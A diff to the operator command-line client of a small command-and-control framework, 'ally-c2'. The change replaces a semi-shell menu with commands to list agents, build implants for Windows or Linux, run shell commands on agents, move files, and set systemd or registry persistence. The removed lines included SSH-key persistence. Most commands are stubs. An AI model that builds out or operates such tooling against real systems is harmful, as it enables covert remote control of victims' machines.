@@ -1,3 +1,4 @@
+from os import sendfile
 import readline #for semi shell interaction in input()
 import asyncio
 import json
@@ -53,46 +54,26 @@ def warning():
 def all_actions(actions):
     if actions == "main":
         print(f"""
-        │
-        ├─ help 
-        │       get this 
-        │
-        ├─ clear
-        │
-        └─ exit
-                exit from the program
-        
-        ├─ shell 
-        │       get's you in a semi shell with the agent
-        │
-        ├─ ch-becon
-        │       change agent beaco time to have higher or lower jitter
-        │
-        ├─ ssh-P
-        │       ssh persistence with your personal key provided in /ssh-p.txt
-        │       [{RED}can lower your OPSEC{RESET}]
-        │
-        └─ sysd-P
-                systemd persistence 
-                [{RED}can lower your OPSEC{RESET}]
-        
-        
+    normal prompt
+    - help
+    - clear
+    - list-agent 
+    - use <agent id>
+    - build
+        ip||url /port/ windows||linux
+
               """)
 
-    if actions == "shell":
+    if actions == "use":
         print(f"""
-        │
-        ├─ help 
-        │       get this 
-        │
-        ├─ clear
-        │
-        └─ exit
-                exit from the program
-        
-        the this shell does http request to the
-        room url so you can chat with the agent
-        and get the output back
+    anget use
+    - help
+    - clear
+    - sh <shell comand>
+    - upload <mypath> <agentpath>
+    - download  <agentpath> <mypath>
+    - percistance 
+        systemd, windows reg
         
               """)
     
@@ -103,7 +84,7 @@ def clear():
 
 
 
-def semi_shell():
+def use_agent():
     while True:
         try:
             shell_cmd = input(f"{BLUE}SHELL@ctrl{RESET}> ")
@@ -136,13 +117,9 @@ def semi_shell():
 
 async def main(server_url):
 
-
     if not warning():
         return
-#     print(f"""\n
-# {BOLD}welcome{RESET} to the ally-cII pannel use {BOLD}/help{RESET} to view
-# all the possible actions
-#           """)
+
     print(f"\n\n{BOLD}welcome{RESET} to the ally-cII pannel use {BOLD}/help{RESET} to view")
     print(f"all the possible actions\n")
    
@@ -151,7 +128,7 @@ async def main(server_url):
         async with websockets.connect(server_url) as websocket:
             while True:
                 try: 
-                    cmd = await asyncio.to_thread(input, f"{YELLOW}COMM@ctrl{RESET}> ")
+                    cmd = await asyncio.to_thread(input, f"{BOLD}server{RESET}[ally-c2] > ")
 
                     cmd = cmd.strip().lower()
 
@@ -163,9 +140,14 @@ async def main(server_url):
                     elif cmd == "clear":
                         clear()
                         continue
-                    elif cmd == "shell":
-                        print(f"\n{BLUE}[*]{RESET} passing to shell mode\n")
-                        semi_shell()
+                    elif cmd == "list-agent":
+                        clear()
+                        continue
+                    elif cmd == "build":
+                        clear()
+                        continue
+                    elif cmd == "use":
+                        use_agent()
                         continue
 
 
@@ -181,42 +163,56 @@ async def main(server_url):
                     response_raw = await websocket.recv()
                     response = json.loads(response_raw)
 
-                    print(f"[Risposta] Status: {response.get('status')} | Output:\n{response.get('output')}\n")
+                    # print(f"[Risposta] Status: {response.get('status')} | Output:\n{response.get('output')}\n")
 
 
 
 
 
 
-                except KeyboardInterrupt:
-                    # ctrl + c
-                    print(f"\n\n[{RED}!{RESET}] you pressed Ctrl+C.")
-                    conferma = input(f"do you really want to {BOLD}exit{RESET}? (y/n): ").strip().lower()
-                    if conferma == 'y':
-                        print(f"\n{BLUE}[*]{RESET} closing ally-cII pannel \n")
-                        break
-                    else:
-                        print("Operation canceled.\n")
-
-                except EOFError:
-                    # ctrl + d
-                    print(f"\n\n[{RED}!{RESET}] you pressed Ctrl+D.")
-                    print(f"{BLUE}[*]{RESET} closing ally-cII pannel \n")
-                    break
+                except (KeyboardInterrupt, EOFError):
+                        print("\n")
+                        conferma = await asyncio.to_thread(
+                                input, f"[{RED}!{RESET}] do you really want to {BOLD}exit{RESET}? (y/n): "
+                                )
+                        if conferma.strip().lower() == 'y':
+                            print(f"\n{BLUE}[*]{RESET} closing ally-cII pannel \n")
+                            break
+                        else:
+                            print("Operation canceled.\n")
+                            continue
 
     except websockets.exceptions.ConnectionClosed:
-        print("[-] Connessione chiusa dal server.")
+        print("[-] Connection closed form server.")
     except Exception as e:
-        print(f"[-] Errore di connessione: {e}")
+        print(f"[-] Error of connection: {e}")
 
 
 if __name__ == "__main__":
 
     server_url = "ws://127.0.0.1:8080/ws/operator"
 
-    try:
-        asyncio.run(main(server_url))
-    except KeyboardInterrupt:
-        print("\n[*] Uscita forzata dalla CLI.")
+    # try:
+    asyncio.run(main(server_url))
+    # except KeyboardInterrupt:
+    #     print("\n[*] Uscita forzata dalla CLI.")
+
+#todo
+#@cli
+# avere una interazione shell decente magari usando una
+# tui che mi semplifica il lavoro con log di send
+# controllo connessione blocco contrl + c 
+# lista implant
+    #funzioni use <implant name>
+     # list implant, gen impalant
+
+#@server
+# spostare i vari comandi agli endpoint giusti,
+# prendere ed reinviare ouput degli agent
+#
+# comando = cmdd
+# agent = id agent != mineid agent no com exec
+#better logging
+
 
 
